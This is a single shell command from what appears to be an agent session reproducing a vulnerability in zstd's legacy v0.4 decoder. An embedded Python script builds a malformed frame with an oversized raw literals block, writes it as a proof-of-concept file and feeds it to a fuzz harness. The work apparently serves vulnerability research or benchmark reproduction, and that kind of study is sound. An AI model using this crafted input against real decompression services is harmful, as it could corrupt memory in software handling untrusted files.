Running command: cd /workspace/repo-vul/src-vul/zstd && nl -ba lib/legacy/zstd_v04.c | sed -n '2480,2515p' && python3 - <<'PY'
import struct, pathlib
lit=131073
csize=lit+3
p=bytearray(b'\x24\xb5\x2f\xfd')
p.append(0) # window log 11 no reserved
p += bytes([((csize>>16)&7), (csize>>8)&255, csize&255])
val=(lit<<2)|1
p += val.to_bytes(3,'little')
p += b'A'*(csize-3)
p += bytes([0xC0,0,0])
# prefix seed
out=b'\x00\x00\x00\x00'+p
pathlib.Path('/workspace/poc_v04_raw').write_bytes(out)
print(len(out), len(p), hex(csize), p[:16].hex(), p[-8:].hex())
PY
cd tests/fuzz && ./simple_decompress /workspace/poc_v04_raw >/tmp/run.log 2>&1; echo status:$?; head -50 /tmp/run.log
